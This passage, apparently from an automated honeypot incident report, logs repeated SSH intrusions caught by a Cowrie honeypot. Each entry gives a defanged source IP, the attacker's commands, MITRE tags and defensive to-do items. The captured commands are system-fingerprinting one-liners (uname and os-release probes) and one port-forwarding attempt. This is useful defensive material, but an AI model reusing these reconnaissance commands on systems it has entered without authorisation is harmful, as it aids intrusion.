| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:52:13` | `cowrie.session.connect` |
| `2026-07-06 04:52:13` | `cowrie.client.version` |
| `2026-07-06 04:52:13` | `cowrie.client.kex` |
| `2026-07-06 04:52:17` | `cowrie.login.success` |
| `2026-07-06 04:52:19` | `cowrie.session.params` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:19` | `cowrie.command.success` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:19` | `cowrie.command.input` |
| `2026-07-06 04:52:20` | `cowrie.log.closed` |
| `2026-07-06 04:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8512c72b157a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:52 |
| **Last Seen** | 2026-07-06 04:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:52:58` | `cowrie.session.connect` |
| `2026-07-06 04:52:59` | `cowrie.client.version` |
| `2026-07-06 04:52:59` | `cowrie.client.kex` |
| `2026-07-06 04:53:02` | `cowrie.login.success` |
| `2026-07-06 04:53:04` | `cowrie.session.params` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:04` | `cowrie.command.success` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:04` | `cowrie.command.input` |
| `2026-07-06 04:53:05` | `cowrie.log.closed` |
| `2026-07-06 04:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b885c2743b24

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:53 |
| **Last Seen** | 2026-07-06 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:53:00` | `cowrie.session.connect` |
| `2026-07-06 04:53:00` | `cowrie.client.version` |
| `2026-07-06 04:53:00` | `cowrie.client.kex` |
| `2026-07-06 04:53:01` | `cowrie.login.success` |
| `2026-07-06 04:53:01` | `cowrie.session.params` |
| `2026-07-06 04:53:01` | `cowrie.command.input` |
| `2026-07-06 04:53:02` | `cowrie.log.closed` |
| `2026-07-06 04:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81e1d4fef4b6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 04:53 |
| **Last Seen** | 2026-07-06 04:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:53:37` | `cowrie.session.connect` |
| `2026-07-06 04:53:39` | `cowrie.client.version` |
| `2026-07-06 04:53:39` | `cowrie.client.kex` |
| `2026-07-06 04:53:44` | `cowrie.login.success` |
| `2026-07-06 04:53:48` | `cowrie.session.params` |
| `2026-07-06 04:53:48` | `cowrie.command.input` |
| `2026-07-06 04:53:49` | `cowrie.log.closed` |
| `2026-07-06 04:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dca1b245e80

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:53 |
| **Last Seen** | 2026-07-06 04:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:53:47` | `cowrie.session.connect` |
| `2026-07-06 04:53:47` | `cowrie.client.version` |
| `2026-07-06 04:53:47` | `cowrie.client.kex` |
| `2026-07-06 04:53:51` | `cowrie.login.success` |
| `2026-07-06 04:53:53` | `cowrie.session.params` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:53` | `cowrie.command.success` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:53` | `cowrie.command.input` |
| `2026-07-06 04:53:54` | `cowrie.log.closed` |
| `2026-07-06 04:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d7d500e4b3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 04:54 |
| **Last Seen** | 2026-07-06 04:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:54:30` | `cowrie.session.connect` |
| `2026-07-06 04:54:30` | `cowrie.client.version` |
| `2026-07-06 04:54:30` | `cowrie.client.kex` |
| `2026-07-06 04:54:30` | `cowrie.login.success` |
| `2026-07-06 04:54:30` | `cowrie.direct-tcpip.request` |
| `2026-07-06 04:54:31` | `cowrie.direct-tcpip.data` |
| `2026-07-06 04:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7525fa69bd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:54 |
| **Last Seen** | 2026-07-06 04:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:54:36` | `cowrie.session.connect` |
| `2026-07-06 04:54:36` | `cowrie.client.version` |
| `2026-07-06 04:54:36` | `cowrie.client.kex` |
| `2026-07-06 04:54:36` | `cowrie.login.success` |
| `2026-07-06 04:54:37` | `cowrie.session.params` |
| `2026-07-06 04:54:37` | `cowrie.command.input` |
| `2026-07-06 04:54:37` | `cowrie.log.closed` |
| `2026-07-06 04:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e24f96072dc1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:54 |
| **Last Seen** | 2026-07-06 04:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:54:36` | `cowrie.session.connect` |
| `2026-07-06 04:54:37` | `cowrie.client.version` |
| `2026-07-06 04:54:37` | `cowrie.client.kex` |
| `2026-07-06 04:54:41` | `cowrie.login.success` |
| `2026-07-06 04:54:43` | `cowrie.session.params` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:43` | `cowrie.command.success` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:43` | `cowrie.command.input` |
| `2026-07-06 04:54:44` | `cowrie.log.closed` |
| `2026-07-06 04:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a9bb5edae5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:55 |
| **Last Seen** | 2026-07-06 04:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:55:25` | `cowrie.session.connect` |
| `2026-07-06 04:55:26` | `cowrie.client.version` |
| `2026-07-06 04:55:26` | `cowrie.client.kex` |
| `2026-07-06 04:55:30` | `cowrie.login.success` |
| `2026-07-06 04:55:31` | `cowrie.session.params` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:31` | `cowrie.command.success` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:31` | `cowrie.command.input` |
| `2026-07-06 04:55:32` | `cowrie.log.closed` |
| `2026-07-06 04:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c8deedf3d91

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:56 |
| **Last Seen** | 2026-07-06 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:56:09` | `cowrie.session.connect` |
| `2026-07-06 04:56:09` | `cowrie.client.version` |
| `2026-07-06 04:56:09` | `cowrie.client.kex` |
| `2026-07-06 04:56:09` | `cowrie.login.success` |
| `2026-07-06 04:56:10` | `cowrie.session.params` |
| `2026-07-06 04:56:10` | `cowrie.command.input` |
| `2026-07-06 04:56:10` | `cowrie.log.closed` |
| `2026-07-06 04:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fee9a3a0720f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:56 |
| **Last Seen** | 2026-07-06 04:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:56:14` | `cowrie.session.connect` |
| `2026-07-06 04:56:15` | `cowrie.client.version` |
| `2026-07-06 04:56:15` | `cowrie.client.kex` |
| `2026-07-06 04:56:18` | `cowrie.login.success` |
| `2026-07-06 04:56:20` | `cowrie.session.params` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:20` | `cowrie.command.success` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:20` | `cowrie.command.input` |
| `2026-07-06 04:56:21` | `cowrie.log.closed` |
| `2026-07-06 04:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1c1a5a3292d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:57 |
| **Last Seen** | 2026-07-06 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:57:02` | `cowrie.session.connect` |
| `2026-07-06 04:57:02` | `cowrie.client.version` |
| `2026-07-06 04:57:02` | `cowrie.client.kex` |
| `2026-07-06 04:57:06` | `cowrie.login.success` |
| `2026-07-06 04:57:08` | `cowrie.session.params` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.command.success` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.command.input` |
| `2026-07-06 04:57:08` | `cowrie.log.closed` |
| `2026-07-06 04:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0beb314292f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:57 |
| **Last Seen** | 2026-07-06 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:57:41` | `cowrie.session.connect` |
| `2026-07-06 04:57:41` | `cowrie.client.version` |
| `2026-07-06 04:57:41` | `cowrie.client.kex` |
| `2026-07-06 04:57:41` | `cowrie.login.success` |
| `2026-07-06 04:57:42` | `cowrie.session.params` |
| `2026-07-06 04:57:42` | `cowrie.command.input` |
| `2026-07-06 04:57:42` | `cowrie.log.closed` |
| `2026-07-06 04:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a24cd87b5da1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:57 |
| **Last Seen** | 2026-07-06 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:57:49` | `cowrie.session.connect` |
| `2026-07-06 04:57:50` | `cowrie.client.version` |
| `2026-07-06 04:57:50` | `cowrie.client.kex` |
| `2026-07-06 04:57:53` | `cowrie.login.success` |
| `2026-07-06 04:57:55` | `cowrie.session.params` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:55` | `cowrie.command.success` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:55` | `cowrie.command.input` |
| `2026-07-06 04:57:56` | `cowrie.log.closed` |
| `2026-07-06 04:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33970f8fb0e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:58 |
| **Last Seen** | 2026-07-06 04:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:58:35` | `cowrie.session.connect` |
| `2026-07-06 04:58:36` | `cowrie.client.version` |
| `2026-07-06 04:58:36` | `cowrie.client.kex` |
| `2026-07-06 04:58:40` | `cowrie.login.success` |
| `2026-07-06 04:58:41` | `cowrie.session.params` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:41` | `cowrie.command.success` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:41` | `cowrie.command.input` |
| `2026-07-06 04:58:42` | `cowrie.log.closed` |
| `2026-07-06 04:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca34537a832

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:59 |
| **Last Seen** | 2026-07-06 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:59:17` | `cowrie.session.connect` |
| `2026-07-06 04:59:17` | `cowrie.client.version` |
| `2026-07-06 04:59:18` | `cowrie.client.kex` |
| `2026-07-06 04:59:18` | `cowrie.login.success` |
| `2026-07-06 04:59:19` | `cowrie.session.params` |
| `2026-07-06 04:59:19` | `cowrie.command.input` |
| `2026-07-06 04:59:19` | `cowrie.log.closed` |
